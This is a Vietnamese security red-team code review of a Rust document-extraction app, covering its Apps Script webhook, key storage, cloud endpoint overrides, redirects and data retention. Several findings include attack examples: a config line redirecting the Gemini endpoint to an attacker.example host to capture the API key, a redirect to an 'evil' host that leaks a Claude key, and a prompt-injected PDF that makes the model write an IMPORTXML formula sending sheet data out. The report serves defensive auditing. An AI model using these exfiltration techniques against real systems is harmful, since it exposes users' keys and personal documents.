# Red-team bảo mật & riêng tư — "Bóc tách dữ liệu" (dema4_rs)

Ngày: 2026-11-01 · Phạm vi: chỉ đọc mã, không sửa. Repo công khai (quangtv1/dema4).

## Phạm vi đã đọc
`src/boc_tach/{khoa_cache,mo_hinh,sheet,luu,excel,chay,doc_json,loai_tai_lieu}.rs`, `src/cau_hinh.rs`,
`src/gui_boc_tach/{cau_hinh,ket_qua}.rs`, `src/gui.rs` (khoa_bt), `src/tram.rs`, `src/license.rs` (ma_may),
`src/tach_vb/du_lieu_an.rs`, `apps-script/loi.js`, `apps-script-mau/boc_tach.gs`, `.github/workflows/build.yml`, `.gitignore`,
mã nguồn ureq 3.5.0 / ureq-proto 0.6.5 (cách xử lý redirect).

Không đụng lại các quyết định đã chốt (bí mật build nằm trong exe, ảnh trang gửi lên cloud, Thử đọc/ReOCR không trừ lượt). Chỉ báo lỗi cụ thể trong cách cài đặt.

## Tóm tắt
Không có lỗi Critical. Các chỗ dễ bị khai thác nhất: (1) script mẫu Apps Script ai cũng gọi được, không có bí mật chung và
không khoá đồng thời; (2) "gắn mã máy" của khoa.bin dùng `ma_may` công khai (hiện trên UI, gửi trạm, in vào tin
Telegram) nên gần như không thêm bí mật nào; (3) file cấu hình dạng chữ thường vẫn đổi được địa chỉ của nhà cung cấp cloud
mà UI không cho thấy, nên khoá API có thể bị gửi tới host lạ; (4) dữ liệu trích xuất (gồm câu trả lời thô) nằm dạng chữ thường
cạnh exe, không có thời hạn xoá.

Những chỗ đã kiểm tra và an toàn được liệt kê ở cuối báo cáo.

---

## Phát hiện (xếp theo mức độ)

### 1. [Medium] Script mẫu Apps Script: webhook "Bất kỳ ai", không xác thực, ai có URL là ghi/ghi đè được Sheet — ĐÃ KIỂM TRA KHI ĐỌC MÃ
- File: `dema4_rs/apps-script-mau/boc_tach.gs:6,15-29`; client `src/boc_tach/sheet.rs:161-163`
- Kịch bản: URL `/exec` lộ ra (dán vào chat hoặc ticket, nằm trong lịch sử trình duyệt, chụp màn hình cấu hình, máy đồng nghiệp dùng chung exe). Kẻ có URL gửi
  `{"tab":"Boc_tach","dong":[["HS01/a.pdf","...giả..."]],"khoa":"HS01/a.pdf"}` để ghi đè dòng thật theo Tên file, hoặc tạo hàng loạt tab tuỳ ý
  (`insertSheet(yc.tab)`, không giới hạn tên hay số lượng), hoặc gửi payload thật lớn để làm đầy Sheet hay hết quota của chủ script.
  Script chạy dưới quyền chủ Sheet ("Thực thi với tư cách: Tôi"). Ngoài ra `String(err)` được trả nguyên về cho người gọi (lộ ít).
- Cách sửa: thêm bí mật chung. Script đọc `PropertiesService.getScriptProperties().getProperty('MA')` rồi so với `yc.ma`; dema4 lưu mã này
  cùng URL trong `khoa.bin` và gửi kèm trong body. Chỉ nhận `tab` trùng một tên cấu hình sẵn (hoặc regex `^[\w \-À-ỹ]{1,50}$`), giới hạn
  `dong.length` (ví dụ ≤ 500) và độ dài mỗi ô. Trả lỗi chung chung, không trả `String(err)`.

### 2. [Medium] Apps Script mẫu không dùng LockService: nhiều máy ghi cùng Sheet thì mất hoặc đè dòng — ĐÃ KIỂM TRA KHI ĐỌC MÃ (race), HẬU QUẢ: PLAUSIBLE
- File: `apps-script-mau/boc_tach.gs:20-24` (`sh.getLastRow() + 1`, `getLastRow() === 0`)
- Kịch bản: đây chính là cách dùng dự kiến ("Sheet của đơn vị"). 2 máy cùng đẩy hàng đợi, 2 lần chạy doPost đọc cùng `getLastRow()`
  nên dòng của máy này đè dòng của máy kia, hoặc dòng tiêu đề bị ghi 2 lần. Mỗi app gửi tuần tự (`luong_gui`), nhưng giữa các máy với nhau
  thì không có gì tuần tự hoá. Nút "Ghi thử" (`gui_boc_tach/cau_hinh.rs:438`) chạy song song với hàng đợi trên cùng một máy.
- Cách sửa: bọc thân doPost trong `var l = LockService.getScriptLock(); l.waitLock(20000); try {...} finally { l.releaseLock(); }`,
  và thêm dòng bằng `sh.appendRow(d)` (nguyên tử) thay cho `getLastRow()+1`.

### 3. [Medium] "Gắn mã máy" trong khoa.bin dùng `ma_may` công khai, nên ai có khoa.bin cũng giải mã được — ĐÃ KIỂM TRA KHI ĐỌC MÃ
- File: `src/boc_tach/khoa_cache.rs:77,85` (`crate::license::ma_may()`), `src/license.rs:94-108` (`SM-XXXX-XXXX-XXXX` = 48 bit đầu của SHA-256(OS id)),
  `src/tram.rs:98` (gửi `ma_may` lên trạm), `apps-script/loi.js:229` (in "Mã máy" vào **mọi** tin Telegram), `src/gui.rs:1692` (hiện trên UI).
- Kịch bản: bí mật build đọc được từ exe phát hành công khai (`option_env!` là literal, chạy `strings` là thấy; đây là giới hạn đã chấp nhận).
  Phần "mã máy" lẽ ra là yếu tố thứ hai nhưng thực tế cũng công khai: ai ở trong nhóm Telegram `huce_network_log`, ai xem được màn license, hoặc ai đọc tab
  log của trạm đều biết `ma_may` của từng máy. Nếu khoa.bin nằm cạnh exe trên ổ chung hoặc Drive (`goc_du_lieu()` ưu tiên thư mục exe,
  `du_lieu_an.rs:59-64`), một đồng nghiệp chép file về là tính được `SHA256(bí_mật ‖ 0 ‖ ma_may)` rồi giải mã toàn bộ khoá API và URL Apps Script.
  Kể cả không biết ma_may thì không gian cũng chỉ có 2^48.
  Đây không phải tranh luận lại quyết định: thiết kế đã chốt là "bí mật build + mã máy", nhưng cài đặt lại lấy bản băm hiển thị/công khai thay cho định danh máy thật.
- Cách sửa: trộn **OS id gốc** (Windows `MachineGuid`, macOS `IOPlatformUUID`, chính chuỗi mà `id_he_dieu_hanh()` trả về) vào khoá thay cho `ma_may()`.
  Đừng bao giờ dùng giá trị đã gửi ra ngoài. Nên thêm salt ngẫu nhiên lưu trong file. Đổi cách dẫn khoá thì khoá cũ không đọc được, người dùng nhập lại một lần
  (`doc()` đã trả rỗng khi giải mã thất bại). Phương án tốt hơn trong cùng chi phí là Windows DPAPI (`CryptProtectData`) hoặc macOS Keychain; nếu không muốn mở rộng phạm vi thì để ngoài.

### 4. [Medium] Địa chỉ của nhà cung cấp cloud vẫn bị file cấu hình ghi đè; UI hiện địa chỉ mặc định nên người dùng không thấy, khoá API có thể bị gửi tới host lạ — ĐÃ KIỂM TRA KHI ĐỌC MÃ
- File: `src/cau_hinh.rs:201-207` (`ket_noi` truyền `m.dia_chi` cho **mọi** nhà cung cấp), `src/cau_hinh.rs:283` (đọc `bt_<mã>_dia_chi` cho cả
  chat_gpt/gemini/claude/open_router), `src/cau_hinh.rs:298` (ghi lại), `src/boc_tach/mo_hinh.rs:114,126-131`;
  UI `src/gui_boc_tach/cau_hinh.rs:192-194` hiện `dia_chi_mac_dinh()` ở ô bị khoá, **không** hiện giá trị thật.
- Kịch bản: `.dema4_saomai.cfg` là file chữ thường nằm cạnh exe (`cau_hinh.rs:516-518`). Exe để trên ổ mạng hoặc Shared Drive (thư mục dự án
  hiện đã nằm trên Shared Drive) thì ai có quyền ghi thư mục đó chỉ cần thêm `bt_gemini_dia_chi=https://attacker.example/v1`.
  Từ lần "Kiểm tra kết nối" hay lần bóc kế tiếp, `Authorization: Bearer <khoá Gemini>` cùng ảnh trang tài liệu bị gửi tới attacker, trong khi
  UI vẫn hiện `generativelanguage.googleapis.com`. Attacker proxy tiếp tới Google thì người dùng không nhận ra gì bất thường.
- Cách sửa: trong `KetNoi::moi` hoặc `ket_noi`, nếu `n.la_dam_may()` thì luôn dùng `n.dia_chi_mac_dinh()`, bỏ qua `m.dia_chi`. Không đọc và không ghi
  `bt_<cloud>_dia_chi`. Thêm test: cấu hình `bt_gemini_dia_chi=http://x` thì `ket_noi(Gemini).dia_chi` vẫn là mặc định.

### 5. [Medium] Dữ liệu trích xuất và câu trả lời thô lưu dạng chữ thường cạnh exe, không có thời hạn xoá; dùng chung khi exe nằm trên ổ chung — ĐÃ KIỂM TRA KHI ĐỌC MÃ (vị trí), RỦI RO: PLAUSIBLE (tuỳ cách triển khai)
- File: `src/boc_tach/luu.rs:32-34,61-63` (`tho` = toàn bộ câu trả lời của mô hình theo từng trang, cùng `gia_tri`), `src/tach_vb/du_lieu_an.rs:22,59-64`
  (`<thư mục exe>/.sm-dema4/<tên nguồn>-<hash>/boc_tach.jsonl`), `src/boc_tach/khoa_cache.rs:23`.
- Kịch bản: `tho` có thể chứa họ tên, số CCCD, địa chỉ, số tiền… (mô hình thường chép lại cả nội dung). Exe chạy từ ổ chung thì jsonl của mọi
  người dồn về một thư mục ẩn dùng chung, được Drive đồng bộ, và không bao giờ bị xoá. Cũng trong trường hợp đó, `khoa.bin` và `.dema4_saomai.cfg` dùng chung: máy B
  không giải mã được khoa.bin của máy A, nhận về rỗng, bấm Lưu là **đè mất** khoá của máy A (lỗi về tính sẵn sàng, `gui.rs:394-397`).
- Cách sửa: dữ liệu theo người dùng (khoa.bin, jsonl) đặt ở `thu_muc_nguoi_dung()` (`%APPDATA%`, `~/Library/Application Support`), không đặt cạnh exe.
  Chỉ lưu `tho` khi có lỗi parse hoặc khi người dùng bật "lưu câu trả lời thô"; có nút xoá dữ liệu bóc tách của thư mục nguồn.

### 6. [Medium] Ghi đè dòng bằng service account: đọc cột A rồi PUT theo số dòng (TOCTOU), khoá chỉ là Tên file tương đối nên dễ đè nhầm — ĐÃ KIỂM TRA KHI ĐỌC MÃ
- File: `src/boc_tach/sheet.rs:184-198`, `src/gui_boc_tach/ket_qua.rs` (`ten_file` = đường dẫn tương đối như `HS01/a.pdf`).
- Kịch bản: (a) giữa lúc GET `A:A` và lúc PUT `A{h+1}`, người khác sắp xếp hoặc xoá dòng trên Sheet hay máy khác chèn dòng, nên bản sửa tay đè vào hồ sơ khác.
  (b) Hai thư mục nguồn khác nhau cùng ghi một tab, cả hai đều có `HS01/a.pdf`, thì `rposition` chọn dòng của thư mục kia. Đây là vấn đề toàn vẹn dữ liệu trên Sheet dùng chung.
  Apps Script `timHang` (`boc_tach.gs:39-45`) cũng bị (b).
- Cách sửa: cột khoá phải duy nhất: thêm cột ẩn hoặc cột đầu `<tên thư mục nguồn>/<tên file>` (hoặc hash đường dẫn tuyệt đối). Trước khi PUT,
  đọc lại ô `A{h+1}` để xác nhận vẫn đúng khoá. Với Apps Script thì làm trong vùng có lock (xem mục 2).

### 7. [Low] Khi redirect, `x-api-key` của Claude vẫn được gửi tiếp tới host mới (ureq chỉ bỏ `Authorization`) — ĐÃ KIỂM TRA KHI ĐỌC MÃ
- File: `src/boc_tach/mo_hinh.rs:122-128`; ureq-proto 0.6.5 `src/client/redirect.rs:76-88` chỉ `headers.remove(AUTHORIZATION)` và `COOKIE`.
  ureq 3.5.0 mặc định có theo redirect, và có theo sang host khác hoặc từ https xuống http.
- Kịch bản: hiện địa chỉ Anthropic cố định nên rủi ro thấp. Kết hợp với mục 4 (địa chỉ bị ghi đè sang host trung gian trả `302 Location: http://evil/`),
  hoặc một proxy hay captive portal trong mạng nội bộ, thì khoá `sk-ant-…` lộ ra. Với OpenAI-compatible thì Bearer được bỏ đúng.
- Cách sửa: `ureq::Agent::config_builder().max_redirects(0)` trong `KetNoi::agent()`; các API này không cần redirect. Agent của Sheet
  (`sheet.rs:78`) phải giữ redirect vì Apps Script cần chuyển `script.google.com` sang `googleusercontent.com`.

### 8. [Low] Thông báo lỗi của nhà cung cấp, có thể chứa mảnh khoá, bị ghi vào jsonl, Excel và Google Sheet dùng chung — ĐÃ KIỂM TRA KHI ĐỌC MÃ (luồng), NỘI DUNG: PLAUSIBLE
- File: `src/boc_tach/mo_hinh.rs:231-238` (`Khoa(thong_bao())` lấy nguyên `error.message`), `src/boc_tach/chay.rs:129` (gửi `SuKien::Loi`
  cho cả lỗi khoá), `ket_qua.rs:249-252` (ghi jsonl, gửi lên Sheet qua `day_sheet` với `co_loi=true`), `excel.rs:90-92`.
- Kịch bản: OpenAI trả 401 với nội dung "Incorrect API key provided: sk-proj-abc…wxyz", và chuỗi này nằm ở cột "Lỗi bóc tách" trên Sheet của đơn vị.
  Khoá không lộ đủ nhưng lộ tiền tố và 4 ký tự cuối, đủ để nhận diện khoá. Thông điệp 200 ký tự từ máy chủ Nội bộ cũng đi theo đường này.
- Cách sửa: với `LoiDoc::Khoa` thì chỉ ghi câu cố định ("Khoá API sai hoặc hết quyền"), không đưa `thong_bao` vào bản ghi, Excel hay Sheet
  (chỉ hiện trên UI). Có thể thêm hàm che các mẫu `sk-[A-Za-z0-9_-]{8,}` / `AIza[0-9A-Za-z_-]{20,}` trước khi lưu.

### 9. [Low] Cho phép `http://` với URL Apps Script và khoá API Nội bộ (gửi dạng chữ thường) — ĐÃ KIỂM TRA KHI ĐỌC MÃ
- File: `src/boc_tach/sheet.rs:103` (chấp nhận `http://`), `mo_hinh.rs:129-131` (gửi Bearer cho Nội bộ dù địa chỉ là `http://`).
- Kịch bản: Wi-Fi công cộng hoặc proxy trong LAN chặn đọc được khoá Nội bộ (nếu có) và dữ liệu trích xuất gửi lên Sheet. Apps Script thật luôn là https nên
  không có lý do nào để nhận http.
- Cách sửa: Apps Script chỉ nhận `https://script.google.com/`. Với Nội bộ, nếu địa chỉ là `http://` và có khoá thì hiện cảnh báo nhỏ dưới ô Khoá (không chặn).

### 10. [Low] `.gitignore` không chặn `.dema4_saomai.cfg` và `.sm-dema4/` (nơi có khoa.bin và jsonl), trong khi `dema4_rs/.sm-dema4/` đã có file được track — ĐÃ KIỂM TRA KHI ĐỌC MÃ
- File: `.gitignore` (chỉ có `sm-dema4.cfg` tên cũ), `git ls-files` cho thấy `dema4_rs/.sm-dema4/index_and_blank.txt`, `xoay_trang.txt` đang được track.
- Kịch bản: dev chép exe vào `dema4_rs/` để thử, bóc một thư mục thật rồi `git add -A`. Khi đó `.sm-dema4/boc_tach/khoa.bin`,
  `…/boc_tach.jsonl` (nội dung tài liệu) và `.dema4_saomai.cfg` (đường dẫn file khoá SA, link Sheet) bị đẩy lên **repo công khai**.
- Cách sửa: thêm `.dema4_saomai.cfg`, `**/.sm-dema4/boc_tach/`, `**/.sm-dema4/*-*/` (thư mục dữ liệu theo nguồn) và `*.jsonl` vào `.gitignore`.
  Hai file đang track thì dùng `!` để giữ lại.

### 11. [Low] Telemetry Bóc tách gửi đường dẫn tuyệt đối của thư mục nguồn lên trạm và Telegram — ĐÃ KIỂM TRA KHI ĐỌC MÃ
- File: `src/tram.rs:199-201` (`duong_dan_tuyet_doi(thu_muc)`), `apps-script/loi.js:344` (`thuMucGon`, tối đa 1000 ký tự).
- Kịch bản: đường dẫn như `C:\Users\nguyenvana\Desktop\Hồ sơ giải phóng mặt bằng - Trần Văn B` chứa tên người dùng và tên hồ sơ, rồi được đưa vào nhóm Telegram.
  Phần còn lại ổn: không có nội dung, không có khoá, `mo_hinh` chỉ gồm tên nhà cung cấp và tên model (không có địa chỉ IP Nội bộ). Cách làm này giống các tính năng Đếm, Tách và Sinh mục lục
  nên chỉ ghi nhận, không coi là lỗi mới.
- Cách sửa (nếu product owner muốn): chỉ gửi tên thư mục cuối, hoặc tên cuối cộng hash của phần còn lại.

### 12. [Low] Bỏ qua lỗi khi ghi khoá; quyền file chỉ được đặt sau khi ghi; `KetNoi` derive `Debug` có khoá — ĐÃ KIỂM TRA KHI ĐỌC MÃ
- `src/gui.rs:397`: `let _ = khoa_cache::ghi(...)`. Ghi lỗi (ổ chỉ đọc, hết chỗ) thì người dùng vẫn tưởng đã lưu, đến phiên sau mới mất khoá. Nên hiện thông báo lỗi.
- `khoa_cache.rs:65-70`: `fs::write` tạo file với quyền theo umask (thường 644) rồi mới `chmod 600`. File đã mã hoá nên hậu quả nhỏ. Có thể mở bằng
  `OpenOptions::mode(0o600)` và ghi qua file tạm rồi rename để tránh hỏng file khi tắt máy giữa chừng.
- `mo_hinh.rs:102` `#[derive(Debug)] struct KetNoi { khoa, .. }`: hiện chưa có chỗ nào in ra (đã grep), nhưng chỉ cần thêm một `{:?}` hay `dbg!` là lộ khoá.
  Nên tự viết `Debug` để che `khoa`.

### 13. [Low · PLAUSIBLE] Chèn công thức qua Apps Script mẫu khi mô hình trả chuỗi bắt đầu bằng `=`
- File: `apps-script-mau/boc_tach.gs:32-36` (`setNumberFormat('@')` trước `setValues`).
- Đánh giá: tài liệu PDF độc hại có thể dùng prompt injection để mô hình trả `=IMPORTXML("https://evil/?d="&A2, ...)`. Định dạng `@` (chữ thuần) đặt **trước**
  `setValues` theo hiểu biết của tôi thì khiến Sheets lưu giá trị đó thành chữ, nhưng tôi chưa chạy thử. Hai đường còn lại đã kiểm tra là an toàn: service account dùng
  `valueInputOption=RAW` (`sheet.rs:157,194`), Excel dùng `write_string_with_format` (`excel.rs:84-91`), cả hai đều không diễn giải công thức.
- Cách sửa: chạy thử một lần với giá trị `=1+1` trên Sheet thật. Nếu thành công thức thì dùng `setValues` với giá trị đã thêm `'` ở đầu cho các chuỗi `^[=+\-@]`
  (giống `oChu` trong `loi.js:26-29`).

---

## Đã kiểm tra là an toàn (để khỏi kiểm tra lại)
- Chèn range hoặc URL trên Sheets qua tên tab: `ma_url` mã hoá phần trăm mọi byte không thuộc `[A-Za-z0-9-_.~]`, dấu nháy được nhân đôi (`sheet.rs:74-76,131-133`);
  `id_sheet` chỉ nhận `[A-Za-z0-9_-]{20,}` (`sheet.rs:44`); tên tab trong `addSheet` đi qua JSON, không ghép chuỗi.
- JWT: header và claims đúng (`iss`, `scope`, `aud`=token URL cố định, `iat`, `exp`=+3600), ký RS256 PKCS#1 v1.5 đúng; token cache 3000 s < 3600 s.
- Khoá riêng SA không bị chép vào cấu hình hay log (chỉ lưu đường dẫn); `CachGhi` không derive `Debug`.
- `Authorization: Bearer` (OpenAI, Gemini, OpenRouter, Sheets) bị ureq bỏ khi redirect (`RedirectAuthHeaders::Never` mặc định).
- Không có `println!` hay log khoá trong mã chạy thật; `println!` chỉ có trong test `#[ignore] goi_that`, và test này lấy địa chỉ, khoá qua biến môi trường.
- Test dùng khoá giả (`AIza-khoa-thu-123`, `k`, `khoa-thu`), máy chủ giả `127.0.0.1:0`, khoá RSA sinh lúc chạy test; `192.168.1.5` trong test
  cấu hình là IP riêng RFC1918 làm ví dụ, không phải IP thật lộ ra.
- `dema4_rs/bi_mat/sheet_key.json` có trên đĩa nhưng đã được `.gitignore` chặn và không nằm trong `git ls-files`.
- CI: `DEMA4_KHOA_CACHE` chỉ truyền vào bước `cargo build`; `cargo test --release tach_vb` không ghi đè exe release (crate chỉ có bin, không có `tests/`).
- Telemetry `so_lieu_boc_tach` không chứa nội dung tài liệu hay khoá; `loi.js` lọc ký tự điều khiển và giới hạn độ dài.
- Tên file Excel lấy từ `file_name()` của thư mục nguồn nên không có path traversal.

## Thứ tự khuyến nghị
1. Mục 4 (bỏ qua `dia_chi` của cloud): một dòng, chặn được rò khoá.
2. Mục 1 và 2 (Apps Script: bí mật chung + LockService + appendRow), phát hành lại script mẫu.
3. Mục 3 (dẫn khoá từ OS id gốc, không dùng `ma_may` công khai).
4. Mục 7 (`max_redirects(0)` cho agent mô hình) và mục 8 (không lưu thông điệp lỗi khoá).
5. Mục 5, 6, 10, rồi các mục Low còn lại.

## Câu hỏi còn mở
- Exe có thực sự được phát cho người dùng chạy từ ổ chung hoặc Shared Drive không? Nếu có thì mục 4 và 5 nên nâng lên High.
- Product owner có chấp nhận việc gửi đường dẫn tuyệt đối lên Telegram (mục 11) cho mọi tính năng không?
- Có muốn chạy thử thực tế hành vi `setNumberFormat('@')` + `setValues('=...')` (mục 13) không?
